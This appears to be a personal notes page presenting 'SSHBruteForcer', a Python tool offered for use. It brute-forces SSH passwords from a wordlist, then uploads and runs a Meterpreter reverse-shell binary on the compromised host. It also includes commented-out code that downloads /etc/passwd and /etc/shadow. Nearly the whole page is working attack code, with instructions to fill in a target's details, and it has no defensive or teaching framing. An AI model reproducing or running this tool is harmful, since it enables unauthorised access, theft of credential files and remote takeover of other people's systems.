
---
layout: memory
title: SSHBruteForcer
---

Tiny and simple SSH brute force tool written in Python3 that can return a meterpreter reverse shell. Edit the source code below for your hostname, username, password, and MSF reverse shell details. There is also functionality to automatically download `/etc/passwd` and `/etc/shadow` from the host. This as you might have already figured out is only working if the host has enough access. 

```python
#!/usr/bin/python3

print("""\                                                                                                                        
   _____  _____  _    _   ____                _          ______                          
  / ____|/ ____|| |  | | |  _ \              | |        |  ____|                          
 | (___ | (___  | |__| | | |_) | _ __  _   _ | |_  ___  | |__  ___   _ __  ___  ___  _ __ 
  \___ \ \___ \ |  __  | |  _ < | '__|| | | || __|/ _ \ |  __|/ _ \ | '__|/ __|/ _ \| '__|
  ____) |____) || |  | | | |_) || |   | |_| || |_|  __/ | |  | (_) || |  | (__|  __/| |   
 |_____/|_____/ |_|  |_| |____/ |_|    \__,_| \__|\___| |_|   \___/ |_|   \___|\___||_|   
                                                                                          
""")

from pwn import *
import paramiko
import os
import time


host = "192.168.0.1"
username = "RandomDude"
port_int = 22
attempts = 0
sshClient = paramiko.SSHClient()
client = paramiko.SSHClient()

with open("wordlist.txt", "r") as password_list:
  for password in password_list:
    password = password.strip("\n")
    try:
     print("[{}] Attempting Password: {}".format(attempts, password, port_int))
     response = ssh(host=host, user=username, password=password, port=port_int, timeout=1)
     if response.connected():
       print("[>] You Cracked It!: {}".format(password))
       sleep(2)
       print("***SENDING METERPRETER SHELL BACK***")
       response.close()
       break
    except paramiko.ssh_exception.AuthenticationException:
     print("[X] Nope, That's Not It")
    attempts += 1

try:
   client = paramiko.SSHClient()
   client.load_system_host_keys()
   client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
   client.connect(hostname=host, port=port_int, username=username, password=password)
   
   sftp = client.open_sftp()
   
# Download   
   
   #filepath = "/etc/passwd"
   #localpath = "/home/user/passwd.txt"
   #sftp.get(filepath,localpath)
   
   #filepath = "/etc/shadow"
   #localpath = "/home/user/shadow.txt"
   #sftp.get(filepath,localpath)

# Upload
   filepath = "/tmp/shell.elf"
   localpath = "shell.elf"
   sftp.put(localpath,filepath)

   sftp.close()

   while True:
   	try:  
   	   stdin, stdout, stderr = client.exec_command('chmod +x /tmp/shell.elf && cd /tmp && ./shell.elf')
   	   print(stdout.read().decode())
   	   break
   	except KeyboardInterupt:
   	    print("Exited On User Command")
   client.close()
except Exception as err:
   print(str(err))

```

*Cough* now time for the ugly part of this script: the dependencies. Add these to `requirements.txt` or poetry. Newwer versions of the dependencies should work but I haven't testet them:

```
paramiko==2.7.2
pwncat==0.4.3
pwntools==4.6.0
```
